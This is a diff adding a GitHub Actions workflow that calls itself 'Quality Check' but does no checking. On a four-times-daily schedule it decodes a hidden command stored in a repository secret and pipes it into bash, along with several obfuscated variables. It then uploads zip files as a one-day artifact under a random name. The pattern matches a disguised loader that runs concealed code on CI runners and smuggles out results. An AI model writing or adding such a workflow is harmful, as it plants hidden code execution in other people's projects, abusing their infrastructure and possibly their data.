@@ -1,0 +1,33 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '35 4,10,16,22 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          auq008: ${{ secrets.auq008 }}
+        run: |
+          printf '%s' "$auq008" | jq -r .ivx64 | /bin/bash
+          echo $ql012 | jq -r .zdfew468 | /bin/bash
+          echo $qvc427 | jq -r .un807 | /bin/bash
+          printf '%s' "$zd293" | jq -r .bavs13 | /bin/bash
+          echo $f3629 | jq -r .uvqgt55 | /bin/bash
+          printf '%s' "$p52" | jq -r .g45467 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: sPQh1SZD
+          path: "*.zip"
+          retention-days: 1
